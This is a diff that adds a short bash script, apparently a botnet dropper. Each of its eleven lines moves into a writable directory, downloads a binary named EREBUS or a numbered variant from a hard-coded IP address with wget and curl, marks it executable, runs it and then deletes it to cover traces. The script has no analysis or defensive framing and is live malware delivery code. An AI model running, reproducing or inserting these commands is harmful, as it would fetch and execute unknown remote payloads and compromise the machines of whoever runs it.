@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS; curl -O http://155.133.24.230/EREBUS; chmod +x EREBUS; ./EREBUS; rm -rf EREBUS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS1; curl -O http://155.133.24.230/EREBUS1; chmod +x EREBUS1; ./EREBUS1; rm -rf EREBUS1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS2; curl -O http://155.133.24.230/EREBUS2; chmod +x EREBUS2; ./EREBUS2; rm -rf EREBUS2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS3; curl -O http://155.133.24.230/EREBUS3; chmod +x EREBUS3; ./EREBUS3; rm -rf EREBUS3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS4; curl -O http://155.133.24.230/EREBUS4; chmod +x EREBUS4; ./EREBUS4; rm -rf EREBUS4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS5; curl -O http://155.133.24.230/EREBUS5; chmod +x EREBUS5; ./EREBUS5; rm -rf EREBUS5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS6; curl -O http://155.133.24.230/EREBUS6; chmod +x EREBUS6; ./EREBUS6; rm -rf EREBUS6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS7; curl -O http://155.133.24.230/EREBUS7; chmod +x EREBUS7; ./EREBUS7; rm -rf EREBUS7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS8; curl -O http://155.133.24.230/EREBUS8; chmod +x EREBUS8; ./EREBUS8; rm -rf EREBUS8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS9; curl -O http://155.133.24.230/EREBUS9; chmod +x EREBUS9; ./EREBUS9; rm -rf EREBUS9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://155.133.24.230/EREBUS10; curl -O http://155.133.24.230/EREBUS10; chmod +x EREBUS10; ./EREBUS10; rm -rf EREBUS10
